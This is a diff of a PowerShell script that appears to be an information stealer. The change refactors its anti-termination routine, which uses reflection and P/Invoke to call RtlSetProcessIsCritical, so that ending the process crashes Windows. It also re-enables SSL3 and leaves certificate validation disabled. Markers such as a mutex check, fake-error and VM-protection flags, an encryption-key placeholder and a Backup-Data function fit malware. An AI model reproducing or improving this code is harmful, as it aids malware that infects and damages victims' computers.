@@ -8,7 +8,8 @@
 #$write_disk_only = $false
 #$vm_protect = $false
 #$encryption_key = "YOUR_ENC_KEY_HERE"
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+$AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
+[System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
 
 if ($debug) {
@@ -24,20 +25,31 @@ else {
 Add-Type -AssemblyName PresentationCore, PresentationFramework, System.Net.Http, System.Windows.Forms, System.Drawing
 
 # Critical Process
-[System.Diagnostics.Process]::EnterDebugMode()
-$domain = [AppDomain]::CurrentDomain
-$name = New-Object System.Reflection.AssemblyName('DynamicAssembly')
-$assembly = $domain.DefineDynamicAssembly($name, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
-$module = $assembly.DefineDynamicModule('DynamicModule')
-$typeBuilder = $module.DefineType('PInvokeType', 'Public, Class')
-$methodBuilder = $typeBuilder.DefinePInvokeMethod('RtlSetProcessIsCritical','ntdll.dll',
-[System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::Static -bor [System.Reflection.MethodAttributes]::PinvokeImpl,
-[System.Runtime.InteropServices.CallingConvention]::Winapi,[void],[System.Type[]]@([uint32], [uint32], [uint32]),
-[System.Runtime.InteropServices.CallingConvention]::Winapi,
-[System.Runtime.InteropServices.CharSet]::Ansi)
-$type = $typeBuilder.CreateType()
-$methodInfo = $type.GetMethod('RtlSetProcessIsCritical')
-function InvokeRtlSetProcessIsCritical {param ([uint32]$isCritical,[uint32]$unknown1,[uint32]$unknown2)$methodInfo.Invoke($null, @($isCritical, $unknown1, $unknown2))}
+function CriticalProcess {
+    param ([Parameter(Mandatory=$true)][string]$MethodName,[Parameter(Mandatory=$true)][uint32]$IsCritical,[uint32]$Unknown1,[uint32]$Unknown2)
+    [System.Diagnostics.Process]::EnterDebugMode() 
+    $domain = [AppDomain]::CurrentDomain
+    $name = New-Object System.Reflection.AssemblyName('DynamicAssembly')
+    $assembly = $domain.DefineDynamicAssembly($name, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $module = $assembly.DefineDynamicModule('DynamicModule')
+    $typeBuilder = $module.DefineType('PInvokeType', 'Public, Class')
+    $methodBuilder = $typeBuilder.DefinePInvokeMethod('RtlSetProcessIsCritical', 'ntdll.dll',
+    [System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::Static -bor [System.Reflection.MethodAttributes]::PinvokeImpl,
+    [System.Runtime.InteropServices.CallingConvention]::Winapi, [void], [System.Type[]]@([uint32], [uint32], [uint32]),
+    [System.Runtime.InteropServices.CallingConvention]::Winapi,
+    [System.Runtime.InteropServices.CharSet]::Ansi)
+    $type = $typeBuilder.CreateType()
+    $methodInfo = $type.GetMethod('RtlSetProcessIsCritical')
+    function InvokeRtlSetProcessIsCritical {
+        param ([uint32]$isCritical,[uint32]$unknown1,[uint32]$unknown2)
+        $methodInfo.Invoke($null, @($isCritical, $unknown1, $unknown2))
+    }
+    if ($MethodName -eq 'InvokeRtlSetProcessIsCritical') {
+        InvokeRtlSetProcessIsCritical -isCritical $IsCritical -unknown1 $Unknown1 -unknown2 $Unknown2
+    } else {
+        Write-Error "Unknown method name: $MethodName"
+    }
+}
 
 function KDMUTEX {
     if ($fakeerror) {
@@ -50,7 +62,7 @@ function KDMUTEX {
         throw "[!] An instance of this script is already running."
     }
     elseif ($criticalprocess -and -not $debug) {
-        InvokeRtlSetProcessIsCritical 1 $null $null	
+        CriticalProcess -MethodName InvokeRtlSetProcessIsCritical -IsCritical 1 -Unknown1 0 -Unknown2 0	
     }
     Invoke-TASKS
 }
@@ -1136,7 +1148,7 @@ function Backup-Data {
 if (CHECK_AND_PATCH -eq $true) {  
     KDMUTEX
     if (!($debug)) {
-        InvokeRtlSetProcessIsCritical 0 0 0
+        CriticalProcess -MethodName InvokeRtlSetProcessIsCritical -IsCritical 0 -Unknown1 0 -Unknown2 0
     }
     $script:SingleInstanceEvent.Close()
     $script:SingleInstanceEvent.Dispose()
